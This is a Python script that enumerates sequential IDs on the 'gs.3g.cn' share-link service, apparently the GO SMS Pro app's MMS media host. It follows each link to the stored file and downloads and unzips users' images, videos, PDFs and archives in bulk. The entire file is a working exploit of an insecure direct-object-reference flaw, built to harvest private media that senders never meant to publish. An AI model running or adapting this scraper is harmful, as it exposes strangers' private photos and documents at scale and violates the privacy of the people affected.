import sys, time, requests, urllib.parse, mimetypes, zipfile, os
allowedExtensions = [".jpg", ".jpeg", ".png", ".zip", ".mp4", ".pdf"] #skipping audio and other files
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}
from os.path import expanduser
home = expanduser("~")
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
localPath = home + "/Downloads/"
print("Downloads folder set to: ", localPath)
#first indexInt with content at 43520
#~20th November 2020 at around 15113519
for indexInt in range(43520,16777216): #change this range if needed
    indexHex = '{0:02x}'.format(indexInt)
    site = "http://gs.3g.cn/D/" + indexHex + "/w"
    print(bcolors.OKBLUE,"Trying: ", site, " at index: ", indexInt, bcolors.ENDC)
    success = False
    retries = 1
    while not success:
        r = requests.get(site,headers=headers)
        if r.status_code == 200:
            success = True
            imageUrl = r.url
            imageUrl = imageUrl.replace('http://gosms.gomocdn.com/mms/v14/index.html?u=', "")
            imageUrl = urllib.parse.unquote_plus(imageUrl)
            imageUrl = imageUrl.rsplit('&')[0]
            r = requests.get(imageUrl)
            if r.status_code == 200:
                content_type = r.headers['content-type']
                extension = mimetypes.guess_extension(content_type)
                fileName = localPath + str(indexHex) + str(extension)
                if extension in allowedExtensions:
                    with open(fileName, 'wb') as f:
                        f.write(r.content)
                        f.close()
                    print(bcolors.OKGREEN, "Downloaded:", fileName, bcolors.ENDC)
                    if extension == ".zip":
                        extractPath = localPath + str(indexHex)
                        from pathlib import Path
                        Path(extractPath).mkdir(parents=True, exist_ok=True)
                        with zipfile.ZipFile(fileName, 'r') as zip_ref:
                                zip_ref.extractall(extractPath)
                                zip_ref.close()
                        os.remove(fileName)
                elif extension == ".gif":
                    print("skipped .gif")
                else:
                    print(bcolors.OKBLUE, "new extension: ", extension, bcolors.ENDC)
            else:
                print(bcolors.WARNING, "Error getting file: ", r.status_code , bcolors.ENDC)

        else:
            if retries > 6:
                success = True
            else:
                wait = retries * 2
                print(bcolors.WARNING, "Error", r.status_code, "! Waiting ",wait," secs and re-trying...", bcolors.ENDC)
                time.sleep(wait)
                retries +=1
        r.close()
